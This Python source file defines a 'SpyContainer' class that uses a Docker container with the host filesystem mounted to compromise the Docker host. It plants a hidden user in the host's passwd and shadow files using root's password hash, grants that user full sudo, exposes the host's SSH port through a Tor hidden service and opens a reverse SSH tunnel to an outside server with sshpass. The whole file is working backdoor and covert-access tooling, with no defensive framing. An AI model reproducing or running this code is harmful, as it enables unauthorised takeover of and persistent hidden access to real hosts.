import logging
import random
import string
import time
from typing import Optional, Tuple

from docker.client import ContainerCollection
from docker.models.containers import Container

logger = logging.getLogger()


class SpyContainer:
    def __init__(self, container: Container) -> None:
        self._container = container

    def get_docker_host_ssh_port(self) -> int:

        sshd_port = self.execute_command(
            "cat /data/etc/ssh/sshd_config | sed -e 's/^[[:space:]]*//' | grep -E "
            " '^Port'"
        )
        assert sshd_port
        ssh_port = sshd_port.strip().split()
        if ssh_port == [] or len(ssh_port) != 2:
            return 22
        else:
            if ssh_port[1].isnumeric():
                return int(ssh_port[1])
            else:
                return 22

    @staticmethod
    def generate_random_word() -> str:
        return "".join(random.choice(string.ascii_lowercase) for _ in range(15))

    def generate_docker_host_unique_username(self) -> str:
        usernames = self.execute_command('cat /data/etc/passwd | cut -d ":" -f 1')
        assert usernames
        while True:
            username = SpyContainer.generate_random_word()
            if username not in usernames:
                break
        return username

    def add_username_to_docker_host(self, username: str, password: str) -> None:
        self.execute_command("echo 'root:{}' | chpasswd".format(password))
        self.execute_command(
            "echo '{}:x:222:222:test:/:/bin/sh' >> /data/etc/passwd".format(username)
        )
        self.execute_command(
            "cat /etc/shadow | grep root | head -1 | sed 's/root/{}/' >>"
            " /data/etc/shadow".format(username)
        )

    # def create_group_as_username(self, username: str) -> None:
    #     self.execute_command(f"echo '{username}:x:222:' >>  /data/etc/group")

    def add_username_to_sudoer_group(self, username: str) -> None:
        self.execute_command(f"mkdir -p /data/etc/sudoers.d")
        self.execute_command(
            f"echo '{username} ALL=(ALL:ALL) ALL' > /data/etc/sudoers.d/{username}"
        )

    # def delete_group_as_username(self, username: str) -> None:
    #     self.execute_command(f"sed -i '/^sudo/s/{username}:x:222:$//' /data/etc/group")

    def delelte_username_from_sudoer_group(self, username: str) -> None:
        self.execute_command(f"rm -rf /data/etc/sudoers.d/{username}")

    def get_free_port_on_docker_host(self) -> int:
        while True:
            open_ports = self.execute_command(
                "ss -tlpn | awk '{print $4}' |rev |cut -d \":\" -f-1 | rev"
            )
            free_port = random.randint(35000, 60000)
            if open_ports is None:
                raise AssertionError()
            if str(free_port) not in open_ports:
                break
        return free_port

    def config_service_tor(
        self, docker_host_ssh_port: int, tor_port_on_docker_host: int
    ) -> None:
        self.execute_command(
            "sed -i 's/#SocksPort 9050/SocksPort {}/g' /etc/tor/torrc".format(
                tor_port_on_docker_host
            )
        )
        self.execute_command(
            "sed -i '0,/#HiddenServicePort 80 127.0.0.1:80/s//HiddenServicePort {} 0.0.0.0:22/' /etc/tor/torrc".format(
                docker_host_ssh_port
            )
        )
        self.execute_command("chown root:root /var/lib/tor")

    def start_service_tor(self) -> None:
        self.execute_command("echo 'tor -f /etc/tor/torrc &' > /root/command")
        self.execute_command("chmod +x /root/command")
        self.execute_command("nohup ./root/command")

    def get_tor_hostname(self) -> str:
        return str(self.execute_command("cat /var/lib/tor/hidden_service/hostname"))

    def wait_until_conect_to_tor_network(self) -> None:
        while True:
            tor_log = self.execute_command("cat /nohup.out")
            logger.info("Spy container can not connect to Tor Netwrok until now.")
            if tor_log is None:
                raise AssertionError("")
            if "100% (done): Done" in tor_log:
                logger.info("Spy container can connect to Tor Netwrok now.")
                break
            time.sleep(5)

    def reverse_ssh_from_docker_host_to_remote_server(
        self,
        another_server_name: str,
        another_server_ssh_port: int,
        another_server_username: str,
        another_server_password: str,
        free_port_on_another_server: int,
    ) -> None:
        self.execute_command(
            "nohup",
            "sshpass",
            "-p",
            another_server_password,
            "ssh",
            "-o 'StrictHostKeyChecking=no' -R *:",
            str(free_port_on_another_server),
            ":localhost:",
            str(another_server_ssh_port),
            another_server_username,
            "@",
            another_server_name,
        )

    def delete_username_from_docker_host(
        self,
        username: str,
    ) -> None:
        self.execute_command("sed -i '/^{}:.*/d' /data/etc/passwd".format(username))
        self.execute_command("sed -i '/^{}:.*/d' /data/etc/shadow".format(username))

    def execute_command(self, *command: str) -> Optional[str]:
        output = self._container.exec_run(
            cmd=["sh", "-c"] + list(command), tty=True, demux=True
        )[1][0]
        if output is None:
            return None
        else:
            return str(output.decode("utf-8"))
